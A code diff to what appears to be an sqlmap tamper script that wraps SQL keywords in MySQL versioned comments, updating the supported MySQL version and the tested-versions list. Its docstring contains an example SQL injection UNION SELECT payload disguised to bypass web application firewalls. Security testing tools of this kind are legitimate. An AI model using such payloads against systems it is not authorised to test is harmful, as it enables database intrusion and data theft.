@@ -19,7 +19,7 @@ from lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS
 __priority__ = PRIORITY.HIGHER
 
 def dependencies():
-    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s < 5.0" % (os.path.basename(__file__)[:-3], DBMS.MYSQL))
+    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s < 5.1" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))
 
 def tamper(payload):
     """
@@ -30,10 +30,10 @@ def tamper(payload):
         * Output: value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND 'QDWa'='QDWa
 
     Requirement:
-        * MySQL < 5.0
+        * MySQL < 5.1
 
     Tested against:
-        * MySQL 4.0.18
+        * MySQL 4.0.18, 5.0.22
 
     Notes:
         * Useful to bypass several web application firewalls when the
